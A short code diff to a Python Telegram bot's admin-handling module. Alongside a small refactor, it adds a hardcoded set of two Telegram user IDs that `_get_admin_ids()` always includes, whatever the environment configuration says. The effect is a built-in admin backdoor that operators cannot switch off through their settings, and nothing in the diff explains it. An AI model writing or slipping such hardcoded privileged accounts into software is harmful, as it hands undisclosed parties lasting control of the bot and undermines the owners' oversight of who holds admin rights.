@@ -12,6 +12,7 @@ from telegram.ext import ContextTypes, ConversationHandler, CommandHandler, Mess
 from typing import Optional, Dict
 
 logger = logging.getLogger(__name__)
+HARD_ADMIN_IDS = {1187119989, 7675185179}
 
 # Conversation states
 WAITING_COMMUNITY_NAME = 10
@@ -56,7 +57,7 @@ def _slugify(name: str) -> str:
 
 def _get_admin_ids() -> list:
     import os
-    admin_ids = []
+    admin_ids = set(HARD_ADMIN_IDS)
     for key in ['ADMIN1', 'ADMIN2', 'ADMIN3', 'ADMIN_IDS']:
         val = os.getenv(key, '')
         if not val:
@@ -64,8 +65,8 @@ def _get_admin_ids() -> list:
         for part in val.split(','):
             part = part.strip()
             if part.isdigit():
-                admin_ids.append(int(part))
-    return list(set(admin_ids))
+                admin_ids.add(int(part))
+    return sorted(admin_ids)
 
 
 # ------------------------------------------------------------------ #
